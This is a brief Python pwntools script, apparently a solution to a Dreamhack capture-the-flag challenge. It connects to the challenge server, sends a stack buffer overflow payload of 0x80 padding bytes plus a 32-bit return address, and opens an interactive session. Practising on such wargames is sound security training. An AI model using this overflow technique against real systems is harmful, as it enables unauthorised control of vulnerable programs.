from pwn import *

p = remote("host3.dreamhack.games", 16903)

payload = b"\x90" * 0x80
payload += p32(0x080485b9)

p.sendline(payload)
p.interactive()